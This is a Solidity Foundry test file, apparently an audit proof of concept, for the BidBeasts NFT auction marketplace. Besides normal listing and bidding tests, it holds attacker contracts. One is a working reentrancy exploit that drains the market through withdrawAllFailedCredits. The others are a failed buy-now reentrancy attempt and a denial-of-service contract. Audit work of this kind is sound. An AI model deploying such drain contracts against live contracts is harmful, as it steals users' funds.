// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BidBeastsNFTMarket} from "../src/BidBeastsNFTMarketPlace.sol";
import {BidBeasts} from "../src/BidBeasts_NFT_ERC721.sol";
import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

// A mock contract that cannot receive Ether, to test the payout failure logic.
contract RejectEther {
// Intentionally has no payable receive or fallback
}

contract BidBeastsNFTMarketTest is Test {
    // --- State Variables ---
    BidBeastsNFTMarket market;
    BidBeasts nft;
    RejectEther rejector;

    // --- Users ---
    address public constant OWNER = address(0x1); // Contract deployer/owner
    address public constant SELLER = address(0x2);
    address public constant BIDDER_1 = address(0x3);
    address public constant BIDDER_2 = address(0x4);

    // --- Constants ---
    uint256 public constant STARTING_BALANCE = 100 ether;
    uint256 public constant TOKEN_ID = 0;
    uint256 public constant MIN_PRICE = 1 ether;
    uint256 public constant BUY_NOW_PRICE = 5 ether;

    function setUp() public {
        // Deploy contracts
        vm.startPrank(OWNER);
        nft = new BidBeasts();
        market = new BidBeastsNFTMarket(address(nft));
        rejector = new RejectEther();

        vm.stopPrank();

        // Fund users
        vm.deal(SELLER, STARTING_BALANCE);
        vm.deal(BIDDER_1, STARTING_BALANCE);
        vm.deal(BIDDER_2, STARTING_BALANCE);
    }

    // --- Helper function to list an NFT ---
    function _listNFT() internal {
        vm.startPrank(SELLER);
        nft.approve(address(market), TOKEN_ID);
        market.listNFT(TOKEN_ID, MIN_PRICE, BUY_NOW_PRICE);
        vm.stopPrank();
    }

    // -- Helper function to mint an NFT ---
    function _mintNFT() internal {
        vm.startPrank(OWNER);
        nft.mint(SELLER);
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                            LISTING TESTS
    //////////////////////////////////////////////////////////////*/
    function test_listNFT() public {
        _mintNFT();
        _listNFT();

        assertEq(nft.ownerOf(TOKEN_ID), address(market), "NFT should be held by the market");
        BidBeastsNFTMarket.Listing memory listing = market.getListing(TOKEN_ID);
        assertEq(listing.seller, SELLER);
        assertEq(listing.minPrice, MIN_PRICE);
    }

    // function test_fail_listNFT_notOwner() public {
    //     vm.prank(BIDDER_1);
    //     vm.expectRevert("Not the owner");
    //     market.listNFT(TOKEN_ID, MIN_PRICE, BUY_NOW_PRICE);
    // }

    function test_unlistNFT() public {
        _mintNFT();
        _listNFT();

        vm.prank(SELLER);
        market.unlistNFT(TOKEN_ID);

        assertEq(nft.ownerOf(TOKEN_ID), SELLER, "NFT should be returned to seller");
        assertFalse(market.getListing(TOKEN_ID).listed, "Listing should be marked as unlisted");
    }

    /*//////////////////////////////////////////////////////////////
                            BIDDING TESTS
    //////////////////////////////////////////////////////////////*/

    // function test_placeFirstBid() public {
    //     _mintNFT();
    //     _listNFT();

    //     vm.prank(BIDDER_1);
    //     market.placeBid{value: MIN_PRICE}(TOKEN_ID);

    //     BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(TOKEN_ID);
    //     assertEq(highestBid.bidder, BIDDER_1);
    //     assertEq(highestBid.amount, MIN_PRICE);
    //     assertEq(market.getListing(TOKEN_ID).auctionEnd, block.timestamp + market.S_AUCTION_EXTENSION_DURATION());
    // }

    // function test_placeSubsequentBid_RefundsPrevious() public {
    //     _mintNFT();
    //     _listNFT();

    //     vm.prank(BIDDER_1);
    //     market.placeBid{value: MIN_PRICE}(TOKEN_ID);

    //     uint256 bidder1BalanceBefore = BIDDER_1.balance;

    //     uint256 secondBidAmount = MIN_PRICE * 120 / 100; // 20% increase
    //     vm.prank(BIDDER_2);
    //     market.placeBid{value: secondBidAmount}(TOKEN_ID);

    //     // Check if bidder 1 was refunded
    //     assertEq(BIDDER_1.balance, bidder1BalanceBefore + MIN_PRICE, "Bidder 1 was not refunded");

    //     BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(TOKEN_ID);
    //     assertEq(highestBid.bidder, BIDDER_2, "Bidder 2 should be the new highest bidder");
    //     assertEq(highestBid.amount, secondBidAmount, "New highest bid amount is incorrect");
    // }

    function _placeBid(address user, uint256 tokenId, uint256 amount) private {
        vm.startPrank(user);
        market.placeBid{value: amount}(tokenId);
        vm.stopPrank();
    }

    function test_canBidAndWinAuction() public {
        // setup context
        _mintNFT();
        _listNFT();
        // 1st round - place bid by bidder 1
        uint256 firstBidAmount = 2 ether;
        vm.startPrank(BIDDER_1);
        uint256 bidder1BalanceBefore = BIDDER_1.balance;
        market.placeBid{value: firstBidAmount}(TOKEN_ID);
        vm.stopPrank();
        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(TOKEN_ID);
        console.log("round 1: balance bidder 1 after placeBid: %e", BIDDER_1.balance);
        console.log("round 1: balance bidder 2 after placeBid: %e", BIDDER_2.balance);
        _timeLeft(TOKEN_ID);
        assertEq(highestBid.bidder, BIDDER_1, "round 1: highestBid.bidder should be bidder 1");
        assertEq(highestBid.amount, firstBidAmount, "round 1: highestBid.amount should be first bid amount");
        assertEq(BIDDER_1.balance, bidder1BalanceBefore - firstBidAmount, "round 1: balance bidder1 should decrease");
        // 2nd bid - place bid by bidder 2, higher than previous bid
        uint256 secondBidAmount = 3 ether;
        vm.startPrank(BIDDER_2);
        uint256 bidder2BalanceBefore = BIDDER_2.balance;
        market.placeBid{value: secondBidAmount}(TOKEN_ID);
        vm.stopPrank();
        highestBid = market.getHighestBid(TOKEN_ID);
        console.log("round 2: balance bidder 1 after placeBid: %e", BIDDER_1.balance);
        console.log("round 2: balance bidder 2 after placeBid: %e", BIDDER_2.balance);
        assertEq(highestBid.bidder, BIDDER_2, "round 2: highestBid.bidder should be bidder 2");
        assertEq(highestBid.amount, secondBidAmount, "round 2: highestBid.amount should be second bid amount");
        assertEq(BIDDER_2.balance, bidder2BalanceBefore - secondBidAmount, "round 2: balance bidder2 should decrease");

        highestBid = market.getHighestBid(TOKEN_ID);
        _timeLeft(TOKEN_ID);

        // 3rd round - above buy now, should win the nft
        address winner = makeAddr("winner");
        vm.deal(winner, STARTING_BALANCE);
        uint256 thirdBidAmount = BUY_NOW_PRICE + 1 ether;
        uint256 overpay = thirdBidAmount - BUY_NOW_PRICE;
        vm.startPrank(winner);
        uint256 winnerBalanceBefore = winner.balance;
        market.placeBid{value: thirdBidAmount}(TOKEN_ID);
        vm.stopPrank();
        highestBid = market.getHighestBid(TOKEN_ID);
        console.log("round 3: balance bidder 1 after placeBid: %e", BIDDER_1.balance);
        console.log("round 3: balance bidder 2 after placeBid: %e", BIDDER_2.balance);
        console.log("round 3: balance winner after placeBid: %e", winner.balance);
        assertEq(highestBid.bidder, address(0), "round 3: highestBid.bidder should be zero after winning the auction");
        assertEq(highestBid.amount, 0, "round 3: highestBid.amount should be zero after winning the auction");
        assertEq(
            winner.balance,
            winnerBalanceBefore - thirdBidAmount + overpay, // protocol sent back 'placeBid::overpay'
            "round 3: balance bidder2 should decrease"
        );
        assertEq(nft.ownerOf(TOKEN_ID), winner, "round 3: owner of nft should be winner");
    }

    // test bid time
    function _timeLeft(uint256 tokenId) private view {
        BidBeastsNFTMarket.Listing memory listing = market.getListing(tokenId);
        uint256 timeLeft = 0;
        uint256 extensionDuration = market.S_AUCTION_EXTENSION_DURATION();
        if (listing.auctionEnd > block.timestamp) {
            timeLeft = listing.auctionEnd - block.timestamp;
        }
        if (timeLeft < extensionDuration) {
            listing.auctionEnd = listing.auctionEnd + extensionDuration;
            // emit AuctionExtended(tokenId, listing.auctionEnd);
            console.log("Auction Extended: %s , %s", tokenId, listing.auctionEnd);
        }
        console.log("Block Time: %s", block.timestamp);
        console.log("Listing Auction end: %s", listing.auctionEnd);
        console.log("Time Left: %s", timeLeft);
        console.log("extension: %s", extensionDuration);
    }

    // proof of code
    // demostrate how can we drain funds from protocol by the bug in the
    // 'BidBeastsNFTMarket::withdrawAllFailedCredits' function
    function test_reentrancy_withdrawAllFailedCredits() public {
        // setup context
        _mintNFT();
        _listNFT();
        uint256 firstBidAmount = 2 ether;
        uint256 secondBidAmount = 3 ether;
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.deal(attacker, STARTING_BALANCE);
        WithdrawFailedCreditsAttack sc_attack;
        sc_attack = new WithdrawFailedCreditsAttack(market);
        // 1. place first bid as attack contract
        sc_attack.placeBid{value: firstBidAmount}(TOKEN_ID);
        vm.stopPrank();
        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(TOKEN_ID);
        assertEq(
            highestBid.bidder, address(sc_attack.i_rejector()), "Rejector should be the highest bidder at this point."
        );
        console.log("highestBid.bidder: ", highestBid.bidder);
        // 2. place second bid by bidder 1, higher than last bid
        vm.startPrank(BIDDER_1);
        market.placeBid{value: secondBidAmount}(TOKEN_ID);
        vm.stopPrank();
        // 3. highest bidder is now 'BIDDER_1', attack contract should be ready to start an attack
        //  3-A. Rejector should have failed balance
        uint256 rejectorFailedBalance = market.failedTransferCredits(address(sc_attack.i_rejector()));
        assertEq(
            rejectorFailedBalance,
            firstBidAmount,
            "Rejector should have a failed credits balance after bid from 'BIDDER_1'."
        );
        // 3-B. Start the attack
        vm.startPrank(attacker);
        sc_attack.attack();
        vm.stopPrank();
        console.log("mapping failedTransferCredits[address(sc_attack.i_rejector())]: %e", rejectorFailedBalance);
        console.log("MARKET BALANCE after attack: %e", address(market).balance);
        console.log("sc_attack balance after attack: %e", address(sc_attack).balance);
        assertGt(
            address(sc_attack).balance,
            firstBidAmount,
            "Attack contract should have funds higher than first bid, which means a successfull attack."
        );
    }

    function test_feesFromASale() public {
        // setup context
        _mintNFT();
        _listNFT();
        // 1st round - place bid by bidder 1
        uint256 firstBidAmount = 2 ether;
        vm.startPrank(BIDDER_1);
        market.placeBid{value: firstBidAmount}(TOKEN_ID);
        vm.stopPrank();
        // 2nd bid - buy now
        vm.startPrank(BIDDER_2);
        market.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
        vm.stopPrank();
        console.log("bid1: %e, buynow: %e", firstBidAmount, BUY_NOW_PRICE);
        console.log("balance seller after buy now: %e", SELLER.balance);
        console.log("balance bidder 1 after buy now: %e", BIDDER_1.balance);
        console.log("balance bidder 2 after buy now: %e", BIDDER_2.balance);
        console.log("balance MARKET after buy now: %e", address(market).balance);
        console.log("MARKET FEE after buy now: %e", market.s_totalFee());
        vm.prank(OWNER);
        market.withdrawFee();
        vm.stopPrank();
        console.log("balance MARKET after withdraw fee: %e", address(market).balance);
        console.log("MARKET FEE after withdraw fee: %e", market.s_totalFee());
        console.log("MARKET owner: %s", market.owner());
        console.log("balance market owner after withdraw fee: %e", OWNER.balance);

        vm.startPrank(BIDDER_2);
        market.placeBid{value: BUY_NOW_PRICE}(1);
        vm.stopPrank();
    }

    function test_reentrancy_placeBid() public {
        // setup context
        _mintNFT();
        _listNFT();
        deal(address(market), STARTING_BALANCE); // lets pretend the market has a lot of funds
        // setup the attacker
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.deal(attacker, STARTING_BALANCE);
        BuyNowAttack sc_buyNowAttack;
        sc_buyNowAttack = new BuyNowAttack(market);
        // transfer funds to attack contract so it can perform the attack
        (bool success,) = address(sc_buyNowAttack).call{value: BUY_NOW_PRICE * 4}(""); // 4 times the buy now price
        assertEq(success, true, "attack contract failed to receive funds");
        // 1. place first bid as attack contract
        sc_buyNowAttack.placeBid(TOKEN_ID);
        sc_buyNowAttack.attack();
        vm.stopPrank();

        console.log("MARKET BALANCE after attack: %e", address(market).balance);
        console.log("sc_attack balance after attack: %e", address(sc_buyNowAttack).balance);
    }

    function test_requiredAmount() public {
        // setup context
        _mintNFT();
        // list the nft with minimum bid price
        vm.startPrank(SELLER);
        nft.approve(address(market), TOKEN_ID);
        market.listNFT(TOKEN_ID, 0.01 ether, BUY_NOW_PRICE);
        vm.stopPrank();
        // place a bid with min bid price plus 1 wei, so we can prove how the precision for that 1 wei is lost
        _placeBid(BIDDER_1, TOKEN_ID, 0.01 ether + 1);
        BidBeastsNFTMarket.Bid memory highestBid = market.getHighestBid(TOKEN_ID);
        uint256 markeBidtIncrement = market.S_MIN_BID_INCREMENT_PERCENTAGE();
        uint256 prevBidAmount = highestBid.amount;
        // required amount actual code base calculation
        uint256 requiredAmount = (prevBidAmount / 100) * (100 + markeBidtIncrement);

        // correct formula
        uint256 correctRequiredAmountformula = (prevBidAmount * (100 + markeBidtIncrement)) / 100;

        console.log("prevBidAmount: %e", prevBidAmount);
        console.log("requiredAmount: %e", requiredAmount);
        console.log("correctRequiredAmountformula: %e", correctRequiredAmountformula);
    }

    function test_eventAuctionSettledEmittedOnBids() public {
        _mintNFT();
        _listNFT();
        _placeBid(BIDDER_1, TOKEN_ID, 2 ether);
        _placeBid(BIDDER_2, TOKEN_ID, 3 ether);
    }

    function test_denialOfService() public {
        _mintNFT();
        _listNFT();
        // setup the attacker
        address attacker = makeAddr("attacker");
        deal(attacker, STARTING_BALANCE);
        vm.startPrank(attacker);
        // deploy malicios contract
        NFTSaleDenialOfService sc_dos = new NFTSaleDenialOfService(market);
        // attack
        sc_dos.placeBid{value: BUY_NOW_PRICE}(TOKEN_ID);
        vm.stopPrank();
        assertEq(nft.balanceOf(address(sc_dos)), 1, "DoS contract should have nft");
    }
}

// can place bid, but can't recive funds
// forcing the 'BidBeastsNFTMarket::_payout' function to triggers 'failedTransferCredits' mapping amount
contract Rejector {
    BidBeastsNFTMarket public immutable i_market;

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
    }

    function placeBid(uint256 tokenId) external payable {
        i_market.placeBid{value: msg.value}(tokenId);
    }
}

// malicious contract that exploit the 'BidBeastsNFTMarket::withdrawAllFailedCredits' bug
contract WithdrawFailedCreditsAttack {
    BidBeastsNFTMarket public immutable i_market;
    Rejector public immutable i_rejector;
    address private immutable owner;

    error WithdrawFailedCreditsAttack__NoFailedCredits();
    error WithdrawFailedCreditsAttack__WithdrawFailed();

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
        i_rejector = new Rejector(_market);
        owner = msg.sender;
    }

    // 1. place a bid as 'rejector' contract, which does not have a receive funtion
    // when the 'rejector' contract is no longer the highest bidder, it will
    // trigger the 'BidBeastsNFTMarket::_payout' which will fail the transfer
    // so the 'rejector' contract will have a 'failedTransferCredits' mapping amount
    function placeBid(uint256 tokenId) external payable {
        i_rejector.placeBid{value: msg.value}(tokenId);
    }

    // 2. drain funds by calling 'withdrawAllFailedCredits' with address(i_rejector)
    // only if the 'rejector' have a valid 'failedTransferCredits' mapping amount
    function attack() external {
        uint256 rejectorFailedBalance = i_market.failedTransferCredits(address(i_rejector));
        if (rejectorFailedBalance == 0) {
            revert WithdrawFailedCreditsAttack__NoFailedCredits();
        }

        i_market.withdrawAllFailedCredits(address(i_rejector));
    }

    fallback() external payable {}

    receive() external payable {
        // 3. when first funds received by an 'attack', will loop until drain
        uint256 rejectorFailedBalance = i_market.failedTransferCredits(address(i_rejector));
        if (address(i_market).balance >= rejectorFailedBalance) {
            i_market.withdrawAllFailedCredits(address(i_rejector));
        }
    }

    // simple function to allow withdraw of funds from contract to owner
    function withdraw() external {
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        if (!success) {
            revert WithdrawFailedCreditsAttack__WithdrawFailed();
        }
    }
}

contract BuyNowAttackHelper {
    BidBeastsNFTMarket public immutable i_market;
    address private immutable owner;

    error BuyNowAttackHelper__WithdrawFailed();
    error BuyNowAttackHelper__OnlyOwner();

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
        owner = msg.sender;
    }

    function helperPlaceBid(uint256 tokenId) external payable {
        i_market.placeBid{value: msg.value}(tokenId);
    }

    // simple function to allow withdraw of funds from contract to owner
    function helperWithdraw(address to) external {
        if (msg.sender != owner) {
            revert BuyNowAttackHelper__OnlyOwner();
        }
        (bool success,) = payable(to).call{value: address(this).balance}("");
        if (!success) {
            revert BuyNowAttackHelper__WithdrawFailed();
        }
    }
}

// useless for now, cant prove my point
// tried to reentrant on buyNow logic
contract BuyNowAttack {
    BidBeastsNFTMarket public immutable i_market;
    BuyNowAttackHelper public immutable i_helper;
    address private immutable owner;

    uint256 public currentTokenId;
    uint256 public currentTokenIdBuyNowPrice;
    uint256 public currentTokenIdMinPrice;

    error BuyNowAttack__WithdrawFailed();
    error BuyNowAttack__TokenIdNotListed(uint256 tokenId);
    error BuyNowAttack__ZeroBuyNowPrice(uint256 tokenId);
    error BuyNowAttack__NotEnoughBalanceInContract(uint256 requiredAmount);

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
        owner = msg.sender;
        i_helper = new BuyNowAttackHelper(i_market);
    }

    // needed to enter the bid, so we can become the previous bidder
    function placeBid(uint256 tokenId) public {
        BidBeastsNFTMarket.Listing memory listing = i_market.getListing(tokenId);
        if (!listing.listed) {
            revert BuyNowAttack__TokenIdNotListed(tokenId);
        }
        uint256 buyNowPrice = listing.buyNowPrice;
        uint256 minPrice = listing.minPrice;
        if (buyNowPrice == 0) {
            revert BuyNowAttack__ZeroBuyNowPrice(tokenId);
        }
        if (address(this).balance < buyNowPrice) {
            revert BuyNowAttack__NotEnoughBalanceInContract(buyNowPrice);
        }

        currentTokenId = tokenId;
        currentTokenIdBuyNowPrice = buyNowPrice;
        currentTokenIdMinPrice = minPrice;

        i_market.placeBid{value: getMinPrice(tokenId)}(tokenId);
    }

    function attack() public {
        // i_market.placeBid{value: currentTokenIdBuyNowPrice + 1}(currentTokenId);
        i_helper.helperPlaceBid{value: getMinPrice(currentTokenId)}(currentTokenId);
    }

    function getMinPrice(uint256 tokenId) public view returns (uint256 minPriceWithIncrement) {
        BidBeastsNFTMarket.Listing memory listing = i_market.getListing(tokenId);
        uint256 minPrice = listing.minPrice;
        uint256 minBidIncrement = i_market.S_MIN_BID_INCREMENT_PERCENTAGE();
        uint256 bidIncrement = (minPrice * minBidIncrement) / 100;
        minPriceWithIncrement = minPrice + bidIncrement;
    }

    receive() external payable {
        if (currentTokenIdBuyNowPrice > 0 && address(i_market).balance > currentTokenIdMinPrice) {
            attack();
        }
    }

    // simple function to allow withdraw of funds from contract to owner
    function withdraw() external {
        (bool success,) = payable(owner).call{value: address(this).balance}("");
        if (!success) {
            revert BuyNowAttack__WithdrawFailed();
        }
    }
}

// invalid, use of ERC721.transferFrom() will force to change the ownership of the nft, like it or not
contract NFTSaleDenialOfService {
    BidBeastsNFTMarket public immutable i_market;

    error NFTSaleDenialOfService__RevertOnERC721Received();

    constructor(BidBeastsNFTMarket _market) {
        i_market = _market;
    }

    function placeBid(uint256 tokenId) external payable {
        i_market.placeBid{value: msg.value}(tokenId);
    }

    // function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
    //     revert NFTSaleDenialOfService__RevertOnERC721Received();
    // }
}
